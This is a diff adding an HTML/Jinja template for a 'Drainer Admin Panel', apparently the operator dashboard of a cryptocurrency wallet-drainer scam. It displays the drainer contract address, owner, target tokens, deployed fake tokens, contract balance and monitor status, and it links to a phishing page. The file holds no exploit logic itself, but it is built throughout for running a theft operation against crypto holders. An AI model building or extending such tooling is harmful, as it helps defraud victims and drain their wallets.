@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drainer Admin</title>
+    <style>
+        :root { color-scheme: dark; }
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0b1220;
+            color: #e5e7eb;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 32px 16px;
+        }
+        .card {
+            width: min(900px, 100%);
+            background: #111827;
+            border: 1px solid #243042;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.25);
+            padding: 28px;
+        }
+        h1 { margin: 0 0 8px; color: #8b5cf6; }
+        .muted { color: #9ca3af; }
+        .error { color: #f87171; margin: 12px 0; }
+        .grid { display: grid; gap: 12px; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); margin-top: 20px; }
+        .panel { background: #1f2937; border: 1px solid #374151; border-radius: 12px; padding: 16px; }
+        .panel strong { display: block; margin-bottom: 6px; color: #cbd5e1; }
+        a { color: #60a5fa; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .actions { margin-top: 20px; }
+        .actions a { margin-right: 12px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Drainer Admin Panel</h1>
+        <p class="muted">Local dashboard for the deployment and monitoring workflow.</p>
+
+        {% if error %}
+            <div class="error">{{ error }}</div>
+        {% else %}
+            {% if deployed and stats %}
+                <div class="grid">
+                    <div class="panel">
+                        <strong>Chain</strong>
+                        <div>{{ stats.get('chain', 'unknown') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Drainer Address</strong>
+                        <div>{{ stats.get('drainer_address', 'n/a') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Owner</strong>
+                        <div>{{ stats.get('owner', 'n/a') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Paused</strong>
+                        <div>{{ stats.get('paused', 'n/a') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Target Tokens</strong>
+                        <div>{{ stats.get('target_tokens', 'n/a') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Fake Tokens</strong>
+                        <div>{{ stats.get('fake_tokens_deployed', 'n/a') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Balance</strong>
+                        <div>{{ stats.get('contract_balance', 'n/a') }} {{ stats.get('currency', '') }}</div>
+                    </div>
+                    <div class="panel">
+                        <strong>Monitor</strong>
+                        <div>{{ 'running' if stats.get('monitor_running') else 'stopped' }}</div>
+                    </div>
+                </div>
+
+                <div class="actions">
+                    <a href="/phishing">Open phishing page</a>
+                    <a href="/logout">Logout</a>
+                </div>
+            {% else %}
+                <p class="muted">No deployment data is available yet. Deploy the contracts first and then reload this page.</p>
+            {% endif %}
+        {% endif %}
+    </div>
+</body>
+</html>
